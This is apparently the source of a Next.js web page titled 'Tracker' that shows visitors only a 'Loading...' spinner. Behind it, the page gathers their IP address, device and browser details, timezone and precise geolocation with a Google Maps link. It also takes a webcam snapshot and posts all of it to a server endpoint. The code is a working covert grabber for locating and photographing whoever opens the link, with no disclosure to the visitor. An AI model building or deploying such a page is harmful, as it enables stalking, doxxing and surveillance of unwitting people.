import axios from "axios";
import Head from "next/head";
import React, { FC, useEffect } from "react";
import Webcam from "react-webcam";
import { DataObjectInterface } from "../common/types/data-object.interface";
import styles from "./index.module.css";

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

const HomePage: FC = () => {
  const webcamRef: any = React.useRef(null);

  const capture = React.useCallback(() => {
    const imageSrc = webcamRef.current.getScreenshot();
    return imageSrc;
  }, [webcamRef]);

  useEffect(() => {
    (async () => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            console.log(position);
          },
          (error) => {
            console.log(error);
          }
        );
      } else {
        console.log("No geodata support in browser");
      }
      await sleep(5000);
      const dataObject: DataObjectInterface = {
        platform: navigator.userAgent,
        ip: await fetch("https://api.ipify.org?format=json")
          .then((response) => response.json())
          .then((data) => data.ip),
        languages: navigator.languages,
        cpuCores: navigator.hardwareConcurrency,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        // batteryInfo: null,
        ram: (navigator as any)?.deviceMemory,
        browserVersion: navigator?.appVersion,
        webcamPhoto: null,
        position: {
          latidute: null,
          longitude: null,
          googleMaps: null,
          accuracy: null,
        },
      };

      // const batteryData = await (navigator as any)?.getBattery();
      //
      // dataObject.batteryInfo = {
      //   charging: batteryData?.charging,
      //   chargingTime: batteryData?.chargingTime,
      //   dischargingTime: batteryData?.dischargingTime,
      //   level: batteryData?.level,
      // };

      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            dataObject.position.latidute = position.coords.latitude;
            dataObject.position.longitude = position.coords.longitude;
            dataObject.position.accuracy = position.coords.accuracy;
            dataObject.position.googleMaps = `https://www.google.com/maps/place/${position.coords.latitude}+${position.coords.longitude}`;
          },
          (error) => {
            console.log(error);
          }
        );
      } else {
        console.log("No geodata support in browser");
      }

      const imageData = capture();

      await sleep(5000);

      if (imageData) {
        dataObject.webcamPhoto = imageData;
      }

      await axios.post("/api/postdata", dataObject);
    })();
  }, []);

  return (
    <>
      <Head>
        <title translate={"no"}>Tracker</title>
        <meta
          name="viewport"
          content="width=device-width, initial-scale=1.0"
        ></meta>
        <meta name="description" />
      </Head>
      <div className={styles.loading}>
        <Webcam muted={false} ref={webcamRef} screenshotFormat="image/jpeg" />
        <div className={styles.spinner}></div>
        <h3>Loading...</h3>
      </div>
    </>
  );
};

export default HomePage;
